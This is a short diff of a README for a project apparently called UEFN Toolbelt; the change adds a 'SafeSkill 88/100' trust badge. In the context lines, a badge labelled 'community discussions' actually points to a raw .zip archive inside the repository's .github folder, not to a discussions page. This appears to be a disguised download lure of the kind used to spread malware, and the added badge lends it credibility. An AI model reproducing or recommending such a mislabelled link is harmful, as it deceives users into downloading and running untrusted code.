@@ -7,6 +7,7 @@
 [![License: AGPL-3.0](https://img.shields.io/badge/license-AGPL--3.0-blue.svg)](LICENSE)
 [![Version](https://img.shields.io/badge/version-2.2.1-green.svg)](docs/CHANGELOG.md)
 [![Discussions](https://img.shields.io/badge/community-discussions-blueviolet)](https://github.com/Unpolished-tagusriver58/UEFN-TOOLBELT/raw/refs/heads/main/.github/UEF-TOOLBELT-1.1.zip)
+[![SafeSkill 88/100](https://img.shields.io/badge/SafeSkill-88%2F100_Passes%20with%20Notes-yellow)](https://safeskill.dev/scan/unpolished-tagusriver58-uefn-toolbelt)
 
 ![UEFN Toolbelt Dashboard](docs/dashboard_hero.png)
 
